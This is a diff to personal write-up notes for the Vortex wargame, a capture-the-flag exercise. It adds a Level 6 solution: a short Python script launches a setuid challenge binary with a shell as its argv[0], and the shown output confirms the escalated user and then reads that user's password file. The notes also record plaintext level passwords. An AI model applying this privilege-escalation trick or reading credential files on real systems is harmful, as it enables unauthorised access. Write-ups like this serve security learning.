@@ -153,5 +153,21 @@ Username: vortex6 Password: *uy5qDRb2
 
 Level 6:
 ------------------------------------------------
+http://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames
 
-Username: vortex7 Password: 
+vortex6@melissa:~$ vim /tmp/myl6.py
+
+import subprocess
+
+argv = ['/bin/sh']
+
+p = subprocess.Popen(argv, executable = './vortex6.bin')        
+p.wait()
+
+vortex6@melissa:~$ python /tmp/myl6.py
+$ id
+uid=5006(vortex6) gid=5006(vortex6) euid=5007(vortex7) groups=5007(vortex7),5006(vortex6)
+$ cat /etc/vortex_pass/vortex7
+Y52jxHtt/
+
+Username: vortex7 Password: Y52jxHtt/
